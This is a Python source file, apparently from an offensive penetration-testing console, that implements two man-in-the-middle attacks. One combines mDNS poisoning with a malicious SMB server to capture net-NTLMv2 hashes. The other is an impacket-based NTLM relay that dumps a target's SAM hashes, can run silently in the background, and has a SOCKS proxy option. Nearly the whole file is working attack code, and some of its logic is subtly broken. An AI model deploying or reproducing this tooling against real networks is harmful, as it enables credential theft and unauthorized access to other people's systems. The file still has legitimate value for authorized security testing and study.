from cmd2.command_definition import with_default_category
from cmd2 import CommandSet, with_default_category, Cmd2ArgumentParser, with_argparser
import argparse

from .servers import MaliciousSmbServer, SmbRelayServer, Proxy
from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from .Poison import MDNS
from multiprocessing import Process, Manager
from threading import Thread
import sys
import os
import signal
from cmd2 import ansi
import cmd2
import logging
from loguru import logger
from time import sleep
from json import loads
import shutil
from requests import get, RequestException
from tabulate import tabulate

from log_symbols import LogSymbols


@with_default_category("Man in the middle attacks")
class SmbServerAttack(CommandSet):
    """[ Class containing smbrelay attack ]"""

    def __init__(self) -> None:
        super().__init__()
        self.__mdns_poisoner = None
        self.__smbserver = None
        self.__attack = None
        self.__alerts_dictionary = Manager().dict()
        self.__define_alerts()
        self.__alerts_hunter = None
        self.__ntlmv2_collected = []
        self.__path_file = os.getcwd()

    def __configure_alerts_thread(self):
        self.__alerts_hunter = Thread(target=self.__display_alerts)
        self.__alerts_hunter.dameon = True
        self.__alerts_hunter.start()

    def __check_directory(self) -> bool:
        return os.path.isdir(self.__path_file) and os.access(
            self.__path_file, os.X_OK | os.W_OK
        )  # Executing and wirte

    def __define_alerts(self):
        self.__alerts_dictionary["new_ntlmv2"] = 0
        self.__alerts_dictionary["stop"] = 0

    def __ends_process_in_the_background(self):
        if self.__attack is not None and self.__attack.is_alive:
            self._cmd.info_logger.success("Finishing mss attack in the background ...")
            self.__attack.terminate()
            self.__attack.join()
            self.__attack = None
            if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
                self.__alerts_dictionary["stop"] = 1
                self.__alerts_hunter.join()
                self.__alerts_dictionary["stop"] = 0
        else:
            self._cmd.error_logger.error("There is not mss process in the background")

    def __try_exit(self, signum, frame):
        self._cmd.info_logger.debug("Block exit ...")

    def __async_options(self):
        sys.stdout = open("/dev/null", "w")
        signal.signal(signal.SIGINT, self.__try_exit)

    def __display_ntlmv2(self):
        if self.__alerts_dictionary["new_ntlmv2"] == 1:
            if self._cmd.terminal_lock.acquire(blocking=False):
                self._cmd.async_alert(
                    f"{LogSymbols.INFO.value} New ntlmv2 hash has been discovered"
                )
                self._cmd.terminal_lock.release()
            self.__alerts_dictionary["new_ntlmv2"] = 0

    def __display_alerts(self):
        while self.__alerts_dictionary["stop"] == 0:
            self.__display_ntlmv2()

    def __components_to_launch(self):
        mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
        mdns_thread.daemon = True
        mdns_thread.start()
        self.__smbserver.start_malicious_smbserver()

    def __launch_necessary_components(self, args: argparse.Namespace) -> None:
        if args.Asynchronous:
            self.__async_options()
        self.__components_to_launch()

    def __synchronous_attack(self):
        try:
            # If ctrl+c then the process terminate and smb_relay exits
            self.__attack.join()
        except KeyboardInterrupt:
            self.__attack.terminate()
            self.__attack.join()
            self.__attack = None
            self._cmd.error_logger.warning("Exiting smb relay attack ...")

    argParser = Cmd2ArgumentParser(
        description="""Malicious smb server attack to get hashes net-NTLMV """
    )
    argParser.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )
    argParser.add_argument(
        "-A",
        "--Asynchronous",
        action="store_true",
        help="Perform the attack in the background. The results will be saved in log/hashes_ntlm",
    )
    argParser.add_argument(
        "-E",
        "--end_attack",
        action="store_true",
        help="End the attack in the background process",
    )
    argParser.add_argument(
        "-ON",
        "--output_ntlmv2",
        action="store",
        default=".",
        help="Output of the hashes ntlmv2",
    )

    @with_argparser(argParser)
    def do_mss(self, args: argparse.Namespace) -> None:
        """[ Command to create a malicious smb server to get ntlm hashes ]

        Args:
            args (argparse.Namespace): [Arguments passed to the smb_relay command]
        """
        if args.end_attack:
            self.__ends_process_in_the_background()
            return
        if self.__attack is not None:
            self._cmd.error_logger.warning(
                "The attack is already running in the background"
            )
            return
        if args.output_ntlmv2 != ".":
            self.__path_file = args.output_ntlmv2

        if not self.__check_directory():
            self._cmd.error_logger.warning("Error with output file")
            return

        if args.Asynchronous:
            self.__configure_alerts_thread()

        self.__mdns_poisoner = MDNS(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
        )

        # output in case of -SS command
        self.__smbserver = MaliciousSmbServer(
            self._cmd.LHOST,
            self._cmd.LPORT,
            args.Asynchronous,
            self.__ntlmv2_collected,
            self.__path_file,
            self.__alerts_dictionary
        )

        self._cmd.info_logger.debug(
            f"""Starting malicious smb server attack using ip: {self._cmd.LHOST} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS} lport:{self._cmd.LPORT}"""
        )

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
            "LPORT": self._cmd.LPORT,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):

            self.__attack = Process(
                target=self.__launch_necessary_components, args=(args,)
            )
            self.__attack.start()
            if not args.Asynchronous:
                self._cmd.info_logger.info(
                    f"Running mss the results will be saved in : {self.__path_file} "
                )
                self.__synchronous_attack()

    def mss_postloop(self) -> None:
        if self.__attack is not None and self.__attack.is_alive:
            self.__attack.terminate()
            self.__attack.join()
            if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
                self.__alerts_dictionary["stop"] = 1
                self.__alerts_hunter.join()


@with_default_category("Man in the middle attacks")
class NtlmRelay(CommandSet):
    def __init__(self):
        super().__init__()
        self.__mdns_poisoner = None
        self.__smb_relay_server = None
        self.__ntlm_relay_process = None

        self.__ouput_sam_dir = os.getcwd()

        # share between process
        self.__alerts_dictionary = Manager().dict()
        self.__define_alerts()
        self.__alerts_hunter = None

        self.__attacks = {"SMB": SMBAttack}
        self.__clients = {"SMB": SMBRelayClient}
        self.__config = None

    @property
    def mdns_poisoner(self) -> MDNS:
        return self.__mdns_poisoner

    @property
    def smb_relay_server(self) -> SmbRelayServer:
        return self.__smb_relay_server

    @mdns_poisoner.setter
    def mdns_poisoner(self, poisoner: MDNS) -> None:
        self.__mdns_poisoner = poisoner

    @smb_relay_server.setter
    def ntlm_relay_attack(self, attack: SmbRelayServer) -> None:
        self.__smb_relay_server = attack

    def __define_alerts(self):
        self.__alerts_dictionary["sam_dump"] = 0
        self.__alerts_dictionary["new_connection"] = 0
        self.__alerts_dictionary["stop"] = 0

    def __configure_alert_thread(self):
        self.__alerts_hunter = Thread(target=self.__display_alerts)
        self.__alerts_hunter.dameon = True
        self.__alerts_hunter.start()

    def __display_sam_alert(self):
        if self.__alerts_dictionary["sam_dump"] == 1:
            if self._cmd.terminal_lock.acquire(blocking=False):
                self._cmd.async_alert(
                    f"{LogSymbols.INFO.value} The SAM of {self._cmd.RHOST} has been dumped"
                )
                self._cmd.info_logger.debug(
                    f"The SAM of {self._cmd.RHOST} has been dumped"
                )
                self._cmd.terminal_lock.release()

            self.__alerts_dictionary["sam_dump"] = 0

    def __display_connection_alert(self):
        if self.__alerts_dictionary["new_connection"] == 1:
            if self._cmd.terminal_lock.acquire(blocking=False):
                self._cmd.async_alert(
                    f"{LogSymbols.INFO.value} New connection! Use show_connections to see it "
                )
                self._cmd.info_logger.debug(
                    f"{LogSymbols.INFO.value} New connection! Use show_connections to see it "
                )
                self._cmd.terminal_lock.release()

            self.__alerts_dictionary["new_connection"] = 0

    def __display_alerts(self):
        while True and self.__alerts_dictionary["stop"] != 1:
            self.__display_sam_alert()
            self.__display_connection_alert()

    def __try_exit(self, signum, frame):
        self._cmd.info_logger.debug("Block exit ...")

    def __launch_necessary_components(self, args: argparse.Namespace) -> None:
        """[ Function to launch the threads that will control the mdns poisoner and the smb server]

        Args:
            mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
            smbserver (SmbServer): [ variable with the SmbServer Object ]
        """
        if not self.__check_directory():
            self._cmd.error_logger.warning(
                "The specified directory does not exists or you don't have access"
            )
            return
        elif args.output_sam != os.getcwd():
            move_sam_result = Thread(target=self.__store_sam_results_of_target)
            move_sam_result.daemon = True
            move_sam_result.start()

        if args.Asynchronous:
            sys.stdout = open("/dev/null", "w")

        if args.proxy:
            proxy_server = Proxy()
            sock_server = proxy_server.server
            self.__config.setRunSocks(True, sock_server)

        if args.Asynchronous:
            self.__mdns_poisoner.logger_level = "DEBUG"
            signal.signal(signal.SIGINT, self.__try_exit)
        mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
        mdns_thread.daemon = True

        mdns_thread.start()
        self.__smb_relay_server.start_smb_relay_server()

    def __synchronous_attack(self):
        try:
            self.__ntlm_relay_process.join()
        except KeyboardInterrupt:
            self.__ntlm_relay_process.terminate()
            self.__ntlm_relay_process.join()
            self.__ntlm_relay_process = None
            self._cmd.error_logger.warning("Exiting smb relay attack ...")

    def __asynchronous_attack(self) -> None:
        self._cmd.info_logger.info(
            f"Running ntlm relay on the background the results will be saved at: {self.__ouput_sam_dir}/{self.__output_sam_file} "
        )

    def __configure_ntlm_relay_attack(self):
        target = TargetsProcessor(
            singleTarget=self._cmd.RHOST,
            protocolClients=self.__clients,
        )
        self.__config = NTLMRelayxConfig()
        self.__config.setMode("RELAY")
        self.__config.target = target
        self.__config.setAttacks(self.__attacks)
        self.__config.setProtocolClients(self.__clients)
        self.__config.setSMB2Support(True)
        self.__config.interfaceIp = self._cmd.LHOST

    def __store_sam_results_of_target(self) -> None:
        while True:
            try:
                os.rename(
                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
                )
                os.replace(
                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
                )
                shutil.move(
                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
                )
            except FileNotFoundError:
                pass

    def __file_exits(self) -> bool:
        exit = False
        print(f"{self.__ouput_sam_dir}/{self.__output_sam_file}")
        if os.path.exists(f"{self.__ouput_sam_dir}/{self.__output_sam_file}"):
            self._cmd.error_logger.warning(
                "The file will be overwrite, do you want to continue ?(y)"
            )
            output = input()
            if output != "y" or output != "yes":
                exit = True
        return exit

    def __check_directory(self) -> bool:
        return os.path.isdir(self.__output_sam_dir) and os.access(
            self.__output_sam_dir, os.X_OK | os.W_OK
        )  # Executing and wirte

    argParser = Cmd2ArgumentParser(
        description="""Command to perform ntlm relay attack"""
    )
    argParser.add_argument(
        "-SS",
        "--show_settable",
        action="store_true",
        help="Show Settable variables for this command",
    )
    argParser.add_argument(
        "-A",
        "--Asynchronous",
        action="store_true",
        help="Perform the attack in the background",
    )

    argParser.add_argument(
        "-P",
        "--proxy",
        action="store_true",
        help="Use a proxy server",
    )
    argParser.add_argument(
        "-OS",
        "--output_sam",
        action="store",
        default=".",
        help="Output from the sam hashes",
    )
    argParser.add_argument(
        "-E",
        "--end_attack",
        action="store_true",
        help="End the attack in the background process",
    )

    @with_argparser(argParser)
    def do_ntlm_relay(self, args: argparse.Namespace) -> None:
        """[ Command to perform ntlm relay attack ]

        Args:
            args (argparse.Namespace): [Arguments passed to the ntlm relay attack ]
        """
        print(self.__alerts_dictionary)
        if args.output_sam != ".":
            self.__output_sam_dir = args.output_sam
        else:
            self.__output_sam_dir = os.getcwd()

        self.__output_sam_file = f"{self._cmd.RHOST}_samhashes.sam"

        exit_value = self.__file_exits()
        if exit_value:
            self._cmd.info_logger.info("Exiting ...")
            return

        self.__configure_alert_thread()

        if args.end_attack:
            self.__ends_ntlm_relay()
            return
        if self.__ntlm_relay_process is not None:
            self._cmd.error_logger.warning(
                "The attacks is already running in the background "
            )
            return

        self.__mdns_poisoner = MDNS(
            self._cmd.LHOST,
            self._cmd.IPV6,
            self._cmd.MAC_ADDRESS,
            self._cmd.INTERFACE,
        )

        self.__configure_ntlm_relay_attack()
        # output in case of -SS command
        self.__smb_relay_server = SmbRelayServer(
            args.Asynchronous, args.proxy, self.__config, self.__alerts_dictionary
        )

        self._cmd.info_logger.debug(
            f"""Starting ntlm relay attack using lhost: {self._cmd.LHOST} rhost:{self._cmd.RHOST} ipv6:{self._cmd.IPV6}
            interface: {self._cmd.INTERFACE} mac_address:{self._cmd.MAC_ADDRESS} lport:{self._cmd.LPORT}"""
        )

        settable_variables_required = {
            "LHOST": self._cmd.LHOST,
            "RHOST": self._cmd.RHOST,
            "IPV6": self._cmd.IPV6,
            "INTERFACE": self._cmd.INTERFACE,
            "MAC_ADDRESS": self._cmd.MAC_ADDRESS,
            "LPORT": self._cmd.LPORT,
        }
        if args.show_settable:
            self._cmd.show_settable_variables_necessary(settable_variables_required)
        elif self._cmd.check_settable_variables_value(settable_variables_required):

            self.__ntlm_relay_process = Process(
                target=self.__launch_necessary_components, args=(args,)
            )
            self.__ntlm_relay_process.start()
            if not args.Asynchronous:
                self.__synchronous_attack()
            else:
                self.__asynchronous_attack()

    argParser = Cmd2ArgumentParser(description="Command to show actual connections")

    def do_show_connections(self, args: argparse.Namespace) -> None:
        if self.__ntlm_relay_process != None:
            url = "http://192.168.253.135:9090/ntlmrelayx/api/v1.0/relays"
            try:
                response = get(url)
                headers = ["Protocol", "Target", "Username", "Admin", "Port"]
                self._cmd.poutput(
                    tabulate(response.json(), headers=headers, tablefmt="sql")
                )
            except RequestException:
                self.error_logger.error("Error while trying to connect")
        else:
            self._cmd.error_logger("The ntlm_relay process is not activated")

    def __ends_ntlm_relay(self) -> None:
        if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
            self._cmd.info_logger.success(
                "Finishing ntlm relay attack in the background ..."
            )
            self.__ntlm_relay_process.terminate()
            self.__ntlm_relay_process.join()
            self.__ntlm_relay_process = None
            if self.__alerts_hunter.is_alive():
                self._cmd.info_logger.debug("Finishing alerts thread ...")
                self.__alerts_dictionary["stop"] = 1
                self.__alerts_hunter.join()
                self.__alerts_dictionary["stop"] = 0

        else:
            self._cmd.error_logger.error(
                "There is not ntlm_relay process in the background"
            )

    def ntlm_relay_postloop(self) -> None:
        if self.__ntlm_relay_process is not None and self.__ntlm_relay_process.is_alive:
            self._cmd.info_logger.debug("Finishing ntlm_relay process ...")
            self.__ntlm_relay_process.terminate()
            self.__ntlm_relay_process.join()
        if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
            self.__alerts_dictionary["stop"] = 1
            self._cmd.info_logger.debug("Finishing alerts thread ...")
            self.__alerts_hunter.join()
